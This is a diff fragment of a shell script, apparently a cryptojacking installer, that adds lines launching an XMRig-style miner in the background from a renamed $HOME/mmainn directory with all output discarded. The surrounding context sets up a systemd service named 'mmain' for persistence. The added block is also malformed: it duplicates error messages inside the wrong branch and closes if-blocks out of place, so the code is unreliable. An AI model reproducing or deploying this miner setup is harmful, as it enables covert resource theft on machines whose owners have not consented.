@@ -194,6 +194,12 @@ else
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
+    echo "[*] Running miner in the background (see logs in $HOME/mmainn/xmrig.log file)"
+    /bin/bash $HOME/mmainn/miner.sh --config=$HOME/mmainn/config_background.json >/dev/null 2>&1
+    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
+    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+  fi
+fi
 
     echo "[*] Creating mmain systemd service"
     cat >/tmp/mmain.service <<EOL
